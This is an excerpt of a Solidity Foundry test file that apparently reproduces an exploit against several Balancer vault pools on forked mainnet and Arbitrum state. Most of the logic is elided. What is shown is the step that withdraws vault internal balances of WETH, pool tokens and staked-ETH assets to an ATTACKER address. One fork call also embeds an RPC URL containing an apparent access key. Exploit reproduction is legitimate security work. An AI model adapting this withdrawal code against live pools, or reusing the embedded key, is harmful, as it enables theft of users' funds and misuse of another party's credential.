...
contract BalancerExactSwapsTest is Test {
    ...
    function testOsEthPool() public {
        ...
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            ...
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(address(WETH)), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(osETH_WETH_BPT), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(osETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            // withdraw manageUserBalance()
            VAULT.manageUserBalance(ops);
            console.log("ATTACKER BALANCE AFTER:");
            console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
    ...
    function testArbitrumPool() public {
        ...
        if (internalBalances[0] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            ...
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ARB_cbETH), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ARB_wstETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[3] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ARB_rETH), amount: internalBalances[3], sender: ATTACKER, recipient: payable(ATTACKER)});
            VAULT.manageUserBalance(ops);
    ...
    function testWeEthRethPool() public {
        ...
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            ...
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(weETH_rETH_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rETH), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
    ...
    function testQuadPool() public {
        ...
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            ...
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(QUAD_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
    ...
    function testEzEthPool() public {
        vm.createSelectFork("https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c", 23717101);
        console.log("Pool: ezETH/WETH (0x596192bb...0659)");
        ...
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            ...
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ezETH_WETH_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(ezETH), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
